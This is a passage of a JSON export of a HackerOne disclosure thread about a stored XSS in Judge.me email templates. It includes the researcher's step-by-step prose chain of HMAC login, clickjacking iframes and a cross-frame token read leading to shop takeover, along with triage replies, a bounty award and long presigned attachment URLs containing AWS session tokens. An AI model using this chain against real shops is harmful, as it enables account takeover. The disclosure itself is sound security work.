VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029051a252e1d7e1c567eacf49c5fd68a50484a6d6bf5e5e69e953e006687d65"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14463130,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "We can reproduce the main report, but we still don't get how the clickjacking part works.",
+      "automated_response": false,
+      "created_at": "2021-11-29T05:58:38.258Z",
+      "updated_at": "2021-11-29T05:58:38.258Z",
+      "actor": {
+        "username": "linhdam",
+        "cleared": false,
+        "verified": false,
+        "url": "/linhdam",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029051a252e1d7e1c567eacf49c5fd68a50484a6d6bf5e5e69e953e006687d65"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14471829,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "I did set `Privileges Required` to None because it is possible to make any user log in your account (and trigger the XSS) and since anyone can create a shop and an email template, no special privileges is required, am I wrong?\n\nThe full exploitation follows these steps (you can read my code on `leak.js` attached exploit - this is meant to be executed on judge.me domain with the XSS):\n1. URL with HMAC authentication (on www subdomain) - who clicks log in my account with the malicious email template\n\n(At this step `leak.js` does the rest of exploitation)\n\n2. Create an iframe to `judge.me/settings` (clickjacking)\n3. Users clicks on `Show`, the ajax request is made and the HTML content is changed from `Show` to the actual token\n4. Create another iframe to the XSS on email template (on main domain this time - judge.me) - Using HMAC authentication\n\nNow we have 2 same-origin iframes and the parent (www subdomain) is cross-origin. The first iframe has the token on its HTML and we control the second iframe since we have an XSS on it.\n\n5. We use the XSS on second iframe to leak HTML content of the first iframe, we can do this in this way: `parent.frames[0].document.body`. It is only possible because both iframe are on the same domain, so it is a same-origin access.\n6. Getting the token from the HTML it's possible to craft the HMAC URL authentication to the victim's store since the token is used as the key to the HMAC algorithm.\n\nIt turns out that I found another exploitation for this XSS: when you log in as shop, your reviewer account still logged in, so you can use this XSS to perform any action as the reviewer :)",
+      "automated_response": false,
+      "created_at": "2021-11-29T16:39:00.890Z",
+      "updated_at": "2021-11-29T16:39:00.890Z",
+      "actor": {
+        "username": "caue",
+        "cleared": false,
+        "verified": false,
+        "url": "/caue",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9p2kas9r0xrwhvs4tacmp324q5b1/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14513799,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @caue \n\nThanks for the explanation again. However, I think you overlook a few points so let me clarify them.\n- It's true that anyone can create an account and add this XSS into a email template. However, the victim is limited to only those who are authenticated to the attacker's account only. In other words, the attacker and the victim have to be admin of the **same** account. This is why we believe this issue should have `Privileges Required` as `High`. \n- About clickjacking, we have `frame-ancestors` attribute in `Content-Security-Policy` header so that we only allow our iframe to be embedded inside the domain of the shop that is currently logged in, meaning if a victim is logged in as shop B, he/she cannot see our iframe that is embedded in attacker shop B. Plus, this CSP also doesn't even allow our iframe to be embedded in our own domain `judge.me`. ",
+      "automated_response": false,
+      "created_at": "2021-12-02T07:30:28.260Z",
+      "updated_at": "2021-12-02T07:30:28.260Z",
+      "actor": {
+        "username": "linhdam",
+        "cleared": false,
+        "verified": false,
+        "url": "/linhdam",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029051a252e1d7e1c567eacf49c5fd68a50484a6d6bf5e5e69e953e006687d65"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14513803,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-12-02T07:30:42.805Z",
+      "updated_at": "2021-12-02T07:30:42.805Z",
+      "actor": {
+        "username": "linhdam",
+        "cleared": false,
+        "verified": false,
+        "url": "/linhdam",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029051a252e1d7e1c567eacf49c5fd68a50484a6d6bf5e5e69e953e006687d65"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14513810,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugRetesting",
+      "message": "We have fixed this issue, can you please help retest this?\n\nWe will mark this as Resolved/Retest-needed with Medium severity, and award accordingly. But we are open to increase the severity (and award) if you can show some POC. ",
+      "automated_response": false,
+      "created_at": "2021-12-02T07:33:20.075Z",
+      "updated_at": "2021-12-02T07:33:20.235Z",
+      "actor": {
+        "username": "linhdam",
+        "cleared": false,
+        "verified": false,
+        "url": "/linhdam",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/613qwlr9euarpq3az6paegjoly1x/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22mind-blown.jpg%22%3B%20filename%2A%3DUTF-8%27%27mind-blown.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=029051a252e1d7e1c567eacf49c5fd68a50484a6d6bf5e5e69e953e006687d65"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14513812,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-12-02T07:33:41.408Z",
+      "updated_at": "2021-12-02T07:33:41.408Z",
+      "actor": {
+        "url": "/judgeme",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/g9q03amoi8tu4efai3eu2n8z2i3y/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Judge.me "
+        }
+      },
+      "bounty_amount": "500.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "judgeme",
+      "collaborator": {
+        "username": "caue",
+        "url": "/caue"
+      }
+    },
+    {
+      "id": 14525607,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::UserCompletedRetest",
+      "message": "The vulnerable code was removed so the payload doesn't work anymore.",
+      "automated_response": false,
+      "created_at": "2021-12-02T23:05:43.496Z",
+      "updated_at": "2021-12-02T23:05:43.496Z",
+      "actor": {
+        "username": "caue",
+        "cleared": false,
+        "verified": false,
+        "url": "/caue",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9p2kas9r0xrwhvs4tacmp324q5b1/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "judgeme"
+    },
+    {
+      "id": 14526687,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I recorded some PoCs of the real impact of this vulnerability. It can leads to shop account takeover and you can perform any action as a logged in normal user.\n\n## Shop takeover:\n{F1532565}\nJavascript code to exploit this:\n██████████\n\n## Impact in normal users\n{F1532566}\nJavascript code to exploit this:\n{F1532568}\n\n**I used the console only because the XSS is already fixed!**",
+      "automated_response": false,
+      "created_at": "2021-12-03T03:35:14.787Z",
+      "updated_at": "2022-06-03T08:42:39.569Z",
+      "actor": {
+        "username": "caue",
+        "cleared": false,
+        "verified": false,
+        "url": "/caue",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9p2kas9r0xrwhvs4tacmp324q5b1/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1532568,
+          "filename": "user_xss.js",
+          "type": "text/javascript",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/o8j4avfgbv79m9pnamrxc26gm9ta?response-content-disposition=attachment%3B%20filename%3D%22user_xss.js%22%3B%20filename%2A%3DUTF-8%27%27user_xss.js&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5537bdbe0e05c5f4f54e146d94128175deaf8579c790f8df20ffdbd7de5f6232"
+        },
+        {
+          "id": 1532566,
+          "filename": "user_xss.mp4",
+          "type": "video/mp4",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3i17m8afp2scscozl2wcb8wmi5e7?response-content-disposition=attachment%3B%20filename%3D%22user_xss.mp4%22%3B%20filename%2A%3DUTF-8%27%27user_xss.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a1ba1e2287b8ab2c8036a6d2a5b1fd07bd2a7b7e81a3092d389b22e273bd7337"
+        },
+        {
+          "id": 1532565,
+          "filename": "shop_takeover.mp4",
+          "type": "video/mp4",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/k52tb89bybboosa1opfo3qry7dfw?response-content-disposition=attachment%3B%20filename%3D%22shop_takeover.mp4%22%3B%20filename%2A%3DUTF-8%27%27shop_takeover.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070251Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5b